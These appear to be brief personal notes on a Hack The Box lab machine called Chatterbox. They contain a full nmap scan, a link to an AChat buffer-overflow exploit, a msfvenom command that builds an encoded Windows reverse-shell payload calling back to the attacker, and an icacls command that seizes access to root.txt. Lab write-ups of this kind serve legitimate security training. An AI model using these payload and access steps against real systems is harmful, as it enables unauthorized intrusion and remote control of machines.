nmap
```
┌──(kali㉿kali)-[~/HTB/chatterbox]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.181.242  
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 21:18 EST
Warning: 10.129.181.242 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.181.242
Host is up (0.10s latency).
Not shown: 64456 closed tcp ports (reset), 1068 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp  open  achat        AChat chat system
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-13T02:21:08-05:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-01-13T07:21:09
|_  start_date: 2025-01-13T07:15:52
|_clock-skew: mean: 6h40m01s, deviation: 2h53m13s, median: 5h00m01s

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   190.89 ms 10.10.14.1
2   194.74 ms 10.129.181.242

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 255.03 seconds
```

![Pasted image 20250113102957](<0. Attachments/Pasted image 20250113102957.png>)

https://www.exploit-db.com/exploits/36025

getting payload
![Pasted image 20250113104759](<0. Attachments/Pasted image 20250113104759.png>)

```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp  LHOST=tun0 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

![Pasted image 20250113104042](<0. Attachments/Pasted image 20250113104042.png>)

![Pasted image 20250113112107](<0. Attachments/Pasted image 20250113112107.png>)

getting root.txt without privesc
![Pasted image 20250113112731](<0. Attachments/Pasted image 20250113112731.png>)
```
icacls root.txt /grant alfred:F
```

To privesc refer - [HTB | Chatterbox. This is a Windows box. You can find it… | by anuragtaparia | InfoSec Write-ups](https://infosecwriteups.com/htb-chatterbox-7deaeec365b5)

Need to plink